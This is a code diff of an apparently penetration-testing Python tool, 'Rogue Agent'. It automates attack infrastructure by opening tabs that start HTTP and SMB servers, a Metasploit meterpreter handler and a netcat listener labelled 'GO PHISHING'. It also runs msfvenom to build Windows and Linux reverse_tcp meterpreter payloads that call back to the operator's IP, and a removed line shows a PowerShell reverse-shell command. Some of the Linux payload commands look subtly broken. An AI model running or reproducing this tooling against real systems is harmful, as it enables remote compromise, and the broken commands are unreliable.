@@ -234,8 +234,7 @@ def checkInterface(variable):
            command("ping -c 5 " + DNS.rstrip(" "))
       if variable == "TIP":
            command("ping -c 5 " + TIP.rstrip(" "))
-   return
-   
+   return   
    
 def idGenerator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
@@ -559,9 +558,17 @@ def options():
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-command("clear")
-command("xdotool key Alt+Shift+S; xdotool type 'ROGUE AGENT'; xdotool key Return")
-command("clear; cat " + dataDir + "/banner1.txt")
+Red    = '\e[1;91m'
+Yellow = '\e[1;93m'
+Reset  = '\e[0m'
+
+command("echo '" + Red + "'")
+command("xdotool key Alt+Shift+S; xdotool type 'ROGUE AGENT'; xdotool key Return; sleep 1")
+command("clear; cat " + dataDir + "/banner0.txt")
+command("echo '" + Yellow + "'")
+print("\t\t\t\t\t\t               T R E A D S T O N E  E D I T I O N                \n")
+command("echo '" + Reset + "'")
+
 print("[*] Booting program, please wait...")
 print("[+] Using localhost IP address " + localIP + "...")
 
@@ -650,8 +657,6 @@ if not os.path.exists(dataDir + "/config.txt"):
    SID = "EMPTY              " 						# DOMAIN SID
    TSH = "EMPTY              " 						# SESSION SHARE
    LTM = "00:00              " 						# LOCAL TIME    
-#   DIR = workDir	       						# DIRECTORY   
-   PTS = POR		       						# FULL PORT LISTING      
 else:
    print("[+] Configuration file found - restoring saved data....")
    DNS = linecache.getline(dataDir + "/config.txt", 1).rstrip("\n")
@@ -666,9 +671,8 @@ else:
    SID = linecache.getline(dataDir + "/config.txt", 10).rstrip("\n")
    TSH = linecache.getline(dataDir + "/config.txt", 11).rstrip("\n")
    LTM = linecache.getline(dataDir + "/config.txt", 12).rstrip("\n")
-#   DIR = linecache.getline(dataDir + "/config.txt", 13).rstrip("\n")      
-   PTS = POR     
-   
+
+PTS = POR
 DNS = spacePadding(DNS, COL1)
 TIP = spacePadding(TIP, COL1)
 POR = spacePadding(POR, COL1)
@@ -681,7 +685,7 @@ DOM = spacePadding(DOM, COL1)
 SID = spacePadding(SID, COL1)
 TSH = spacePadding(TSH, COL1)
 LTM = spacePadding(LTM, COL1)
-# DIR = spacePadding(DIR, COL1)
+
 with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2, open(dataDir + "/tokens.txt", "r") as read3, open(dataDir + "/shares.txt", "r") as read4:
    for x in range(0, maxUser):
       USER[x] = read1.readline()
@@ -693,9 +697,11 @@ with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt
       USER[x] = spacePadding(USER[x], COL3)
       HASH[x] = spacePadding(HASH[x], COL4)    
       VALD[x] = spacePadding(VALD[x], COL5)
+
 if DOM[:5] != "EMPTY":
    command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
    DOMC = 1
+
 if":" in TIP:
    IP46 = "-6"
 else:
@@ -711,8 +717,9 @@ else:
 
 print("[*] Starting HTTP server...")
 command("xdotool key Ctrl+Shift+T")
-command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return")
-command("xdotool type 'clear; cat " + dataDir + "/banner1.txt; cat " + dataDir + "/banner2.txt'; xdotool key Return")
+command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return; sleep 1")
+command("xdotool type 'clear; cat " + dataDir + "/banner1.txt'; xdotool key Return")
+command("xdotool type 'cat " + dataDir + "/banner2.txt'; xdotool key Return")
 command("xdotool type 'python3 -m http.server 8080'; xdotool key Return")
 
 # -------------------------------------------------------------------------------------
@@ -725,7 +732,7 @@ command("xdotool type 'python3 -m http.server 8080'; xdotool key Return")
 
 print("[*] Starting SMB server...")
 command("xdotool key Ctrl+Shift+T")
-command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return")
+command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return; sleep 1")
 command("xdotool type 'clear; cat " + dataDir + "/banner3.txt'; xdotool key Return")
 command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return")
 
@@ -747,7 +754,7 @@ with open("meterpreter.rc", "w") as write:
    write.write("run\n")   
    
 command("xdotool key Ctrl+Shift+T")
-command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return")
+command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return; sleep 1")
 command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
 
 # -------------------------------------------------------------------------------------
@@ -760,7 +767,7 @@ command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
 
 print("[*] Starting phishing server...")
 command("xdotool key Ctrl+Shift+T")
-command("xdotool key Alt+Shift+S; xdotool type 'GO PHISHING'; xdotool key Return")
+command("xdotool key Alt+Shift+S; xdotool type 'GO PHISHING'; xdotool key Return; sleep 1")
 command("xdotool type 'clear; cat " + dataDir + "/banner5.txt'; xdotool key Return")
 command("xdotool type 'rlwrap nc -nvlp 80'; xdotool key Return")
 command("xdotool key Ctrl+Shift+Tab")
@@ -774,9 +781,10 @@ command("xdotool key Ctrl+Shift+Tab")
 # -------------------------------------------------------------------------------------
 
 print("[*] Creating exploit files...")
-# command("cp " + httpDir + "/template.txt " + httpDir + "/reverseshell.ps1")
-# command('echo Invoke-PowerShellTcp -Reverse -IPAddress ' + localIP + ' -Port 9001 >> ' + httpDir + '/reverseshell.ps1')
-command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform windows -f exe -o " + httpDir + "/winshell.exe > /dev/null 2>&1")
+command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform windows -a x64 -f exe -o " + httpDir + "/winshell64.exe > /dev/null 2>&1")
+command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform windows -a x86 -f exe -o " + httpDir + "/winshell32.exe > /dev/null 2>&1")
+command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform linux/x64/meterpreter/reverse_tcp -f exe -o " + httpDir + "/linuxshell64.elf > /dev/null 2>&1")
+command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT=4444 --platform linux/x86/meterpreter/reverse_tcp -f exe -o " + httpDir + "/linuxshell32.elf > /dev/null 2>&1")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
